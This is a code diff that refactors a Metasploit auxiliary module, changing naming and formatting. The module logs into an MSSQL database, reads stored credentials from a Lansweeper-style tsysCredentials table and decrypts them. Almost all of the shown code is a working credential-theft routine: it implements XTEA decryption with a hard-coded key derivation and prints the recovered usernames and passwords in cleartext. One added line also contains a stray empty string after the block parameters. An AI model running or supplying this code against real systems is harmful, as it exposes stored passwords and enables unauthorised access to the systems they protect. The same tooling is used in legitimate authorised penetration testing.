@@ -43,62 +43,65 @@ class Metasploit3 < Msf::Auxiliary
     n & 0xffffffff
   end
 
-  def xteadecode(v, k)
-    num = 0xc6ef3720
-    num2 = uint32(v[0])
-    num3 = uint32(v[1])
+  def xtea_decode(v, k)
+    sum = 0xc6ef3720
+    v_0 = uint32(v[0])
+    v_1 = uint32(v[1])
 
     0.upto(0x1f) do
-      num3 -= uint32((uint32(num2 << 4) ^ uint32(num2 >> 5)) + num2) ^
-              uint32(num + k[uint32(num >> 11) & 3])
-      num3 = uint32(num3)
-      num -= 0x9e3779b9
-      num = uint32(num)
-      num2 -= ((uint32(uint32(num3 << 4) ^ uint32(num3 >> 5)) + num3) ^
-              uint32(num + k[num & 3]))
-      num2 = uint32(num2)
+      v_1 -= uint32((uint32(v_0 << 4) ^ uint32(v_0 >> 5)) + v_0) ^ uint32(sum + k[uint32(sum >> 11) & 3])
+      v_1 = uint32(v_1)
+      sum -= 0x9e3779b9
+      sum = uint32(sum)
+      v_0 -= (uint32(uint32(v_1 << 4) ^ uint32(v_1 >> 5)) + v_1) ^ uint32(sum + k[sum & 3])
+      v_0 = uint32(v_0)
     end
-    v[0] = num2
-    v[1] = num3
+
+    v[0] = v_0
+    v[1] = v_1
   end
 
-  def xteadecrypt(data, key)
+  def xtea_decrypt(data, key)
     k = key.ljust(16).unpack('VVVV')
     num = 0
     bytes = Array.new
 
     0.step(data.length - 1, 8) do |i|
       v = data[i, 8].unpack('VV')
-      xteadecode(v, k)
+      xtea_decode(v, k)
       bytes[num] = v[0]
       num += 1
       bytes[num] = v[1]
       num += 1
     end
+
     bytes.pack('c*')
   end
 
-  def lswgeneratepass
+  def lsw_generate_pass
     key = ''
-    for num in 0..60
+
+    (0..60).each do |num|
       key << [((40 - num) + ((num * 2) + num)) - 1].pack('c')
       key << [(num + 15) + num].pack('c')
     end
+
     key
   end
 
-  def lswdecrypt(data)
+  def lsw_decrypt(data)
     data = Rex::Text.decode_base64(data)
 
     first = data[0]
     pass = data[1, 8]
-    actualdata = data[9, data.length - 9]
+    actual_data = data[9, data.length - 9]
 
-    decrypted = xteadecrypt(actualdata, pass + lswgeneratepass)
+    decrypted = xtea_decrypt(actual_data, pass + lsw_generate_pass)
 
-    if first == "1"
+    if first == '1'
       decrypted = decrypted[0, decrypted.length - 2]
     end
+
     Rex::Text.to_ascii(decrypted, 'utf-16le')
   end
 
@@ -108,8 +111,9 @@ class Metasploit3 < Msf::Auxiliary
       port: opts[:port],
       protocol: 'tcp',
       workspace_id: myworkspace.id,
-      service_name: opts[:creds_name],
+      service_name: opts[:creds_name]
     }
+
     credential_data = {
       username: opts[:user],
       private_type: :password,
@@ -117,6 +121,7 @@ class Metasploit3 < Msf::Auxiliary
       origin_type: :service,
       module_fullname: self.fullname
     }.merge(service_data)
+
     login_data = {
       core: create_credential(credential_data),
       status: Metasploit::Model::Login::Status::UNTRIED
@@ -127,13 +132,15 @@ class Metasploit3 < Msf::Auxiliary
 
   def run
     unless mssql_login_datastore
-      fail_with(Failure::NoAccess, "Login failed. Check credentials.")
+      fail_with(Failure::NoAccess, 'Login failed. Check credentials.')
     end
-    result = mssql_query('select Credname, Username, Password from ' + datastore['DATABASE'] +
-    '.dbo.tsysCredentials WHERE LEN(Password)>64', false)
-    result[:rows].each do |row|
-      pw = lswdecrypt(row[2])
+    result = mssql_query("select Credname, Username, Password from #{datastore['DATABASE']}.dbo.tsysCredentials WHERE LEN(Password)>64", false)
+
+    result[:rows].each do |row|""
+      pw = lsw_decrypt(row[2])
+
       print_good("Credential name: #{row[0]} | username: #{row[1]} | password: #{pw}")
+
       report_cred(
         :host => rhost,
         :port => rport,
